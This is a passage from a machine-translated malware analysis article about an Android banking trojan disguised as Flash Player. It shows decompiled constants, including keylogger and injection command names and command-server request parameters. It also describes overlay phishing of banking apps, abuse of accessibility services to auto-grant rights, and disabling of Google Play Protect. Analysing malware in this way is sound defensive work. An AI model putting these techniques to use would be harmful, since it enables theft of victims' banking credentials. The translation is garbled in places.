class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f5F = mo1a(<span class="hljs-string"><span class="hljs-string">"wtxndsosbhnaYzZjNzhhYzA2MDMyMTBkOA=="</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: G */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f6G = mo1a(<span class="hljs-string"><span class="hljs-string">"nmibahlxjjsxM2IzNjY4NGUyZDIzYmYwZGVi"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: H */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f7H = mo1a(<span class="hljs-string"><span class="hljs-string">"vvgipgmxvxloN2NmZDdlNTkyNjRhYWVlMzkzZGIzMGFiYTUzM2E5"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: I */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f8I = mo1a(<span class="hljs-string"><span class="hljs-string">"zuqkhqhqsrvgMDczYWRkZmYyOTE5NmVmMzk2Yzc="</span></span>);</code> </pre> <br><br>  I wrote a script to convert these strings to a normal view, it helped me pass the time. <br><br><pre> <code class="java hljs"> <span class="hljs-comment"><span class="hljs-comment">/* renamed from: A */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_statMails = <span class="hljs-string"><span class="hljs-string">"statMails"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: B */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_activeDevice = <span class="hljs-string"><span class="hljs-string">"activeDevice"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: C */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_timeWorking = <span class="hljs-string"><span class="hljs-string">"timeWorking"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: D */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_statDownloadModule = <span class="hljs-string"><span class="hljs-string">"statDownloadModule"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: E */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_lockDevice = <span class="hljs-string"><span class="hljs-string">"lockDevice"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: F */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_offSound = <span class="hljs-string"><span class="hljs-string">"offSound"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: G */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_keylogger = <span class="hljs-string"><span class="hljs-string">"keylogger"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: H */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_activeInjection = <span class="hljs-string"><span class="hljs-string">"activeInjection"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: I */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_timeInject = <span class="hljs-string"><span class="hljs-string">"timeInject"</span></span>;</code> </pre> <br>  We also see what is stored in this class: <br><br><pre> <code class="java hljs"> <span class="hljs-comment"><span class="hljs-comment">/* renamed from: ay */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_url = <span class="hljs-string"><span class="hljs-string">"https://twitter.com/LukasStefanko"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: az */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_Accessibility = <span class="hljs-string"><span class="hljs-string">"Flash Player Service"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bb */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate1 = <span class="hljs-string"><span class="hljs-string">"action=registration&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bc */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate2 = <span class="hljs-string"><span class="hljs-string">"action=sendInjectLogs&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bd */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate3 = <span class="hljs-string"><span class="hljs-string">"action=sendSmsLogs&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: be */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate4 = <span class="hljs-string"><span class="hljs-string">"action=timeInject&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bf */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate5 = <span class="hljs-string"><span class="hljs-string">"action=sendKeylogger&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bg */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate6 = <span class="hljs-string"><span class="hljs-string">"action=getModule&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bh */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate7 = <span class="hljs-string"><span class="hljs-string">"action=checkap&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bj */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_country = <span class="hljs-string"><span class="hljs-string">"[ua][ru][by][tj][uz][tm][az][am][kz][kg][md]"</span></span>;</code> </pre> <br><br>  The server URL is specified on the Lukas Stefanko twitter recruiter (@LukasStefanko), apparently the author wanted to joke or say something to Lucas (This is an analyst from NOD32), the Accessibility Service + name is also stored here and the same name is stored in the android manifest: label = ‚ÄúFlash Player Service ‚Äù, and a list of countries for which the hardware does not work. <br><br><h2>  Rest </h2><br>  Briefly describe the work injects.  It is implemented simply if the Accessibility Service is enabled, then this service simply catches the launch of the banking application and runs its activation on top of the bank‚Äôs activation, where it has a WebView object that loads the html fake bank, then receives data using JavaScript and sends the data to Malvari server. <br><br>  Also in this service is implemented Keylogger, blocking the removal of Malvari and auto-click on confirmations.  A disconnect security interaction was detected in the com.miui.securitycenter application.  This application is called ‚ÄúSecurity‚Äù that is used on Xiaomi devices, its main tasks are to monitor the security of your confidential data.  Also, a code was found to automatically disable Google Play Protect using the auto-click method. <br><br><h2>  Let's go to practice </h2><br>  I managed to find twitter villains and get a screenshot of the admin panel <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ff3/d9e/c29/ff3d9ec29b0ab525130052b32a9d2a10.png" alt="image"><br><br>  Install the apk-package on the emulator with API 27. <br><br>  A flash player icon called ‚ÄúFlash Player‚Äù appeared on the desktop. <br><br><div class="spoiler">  <b class="spoiler_title">Screenshot</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/ff2/516/805/ff25168051a4d17b8b22b15daac7244a.png" alt="image"><br></div></div><br>  We are waiting for the icon, and we run malware. <br><br>  After the launch of the Malvari, the Auto Activation starts automatically with the requirement to enable the Accessibility Service, if you collapse it, it will appear again and this happens in a loop until I enable the service. <br><br><div class="spoiler">  <b class="spoiler_title">Screenshot</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/9c9/cbd/98c/9c9cbd98c2afaf3750d131a5003e9c9e.png" alt="image"><img src="https://habrastorage.org/getpro/habr/post_images/e1d/9c1/48e/e1d9c148e24105b8db66848ae777fd79.png" alt="image"><br></div></div><br>  After turning on the Accessibility Service checkbox, the automatic transition from the settings to the desktop was performed, and I could not get to the Accessibility Service settings anymore, the icon from the desktop also disappeared, after a few seconds I was asked to disable Doze Mode, it automatically disconnected due to the auto-click on special features . <br><br><div class="spoiler">  <b class="spoiler_title">Screenshot</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/d57/1b2/841/d571b28415c001fa433e5c171aecb2a1.png" alt="image"><br></div></div><br>  Following was the same way auto confirmation of administrator rights.  It was not possible to delete the malware manually because opening the settings for this application was automatically backtracked (GLOBAL_ACTION_BACK). <br><br>  Actually, this is all in the first part, in a short time I will write the second part with an additional and possibly with the main module of this bot, since I could not find the apk file with the valid link to the server. <br><br>  The reverse of the Malvari was implemented jointly with <a href="https://habr.com/ru/users/keklick1337/" class="user_link">keklick1337</a> </div><p>Source: <a href="https://habr.com/ru/post/459858/">https://habr.com/ru/post/459858/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../459842/index.html">Luxor</a></li>
<li><a href="../459844/index.html">Penguin in the window: the potential and prospects for WSL2</a></li>
<li><a href="../45985/index.html">Chrome will support extensions.</a></li>
<li><a href="../459850/index.html">Amateur radio technology: how I ordered the installation of a PCB in a Chinese factory</a></li>
<li><a href="../459852/index.html">The practice of using the lottie library in the bank‚Äôs mobile application</a></li>
<li><a href="../459860/index.html">Configure ClickHouse for integration testing in gitlab-ci</a></li>
<li><a href="../459862/index.html">Berkeley DB STL Interface</a></li>
<li><a href="../459866/index.html">Solving a task with pwnable.kr 02 - collision. Hash collision</a></li>
<li><a href="../459870/index.html">Sample Model-View-Update Architecture on F #</a></li>
<li><a href="../459872/index.html">Patton Jeff. User stories. The art of agile software development</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>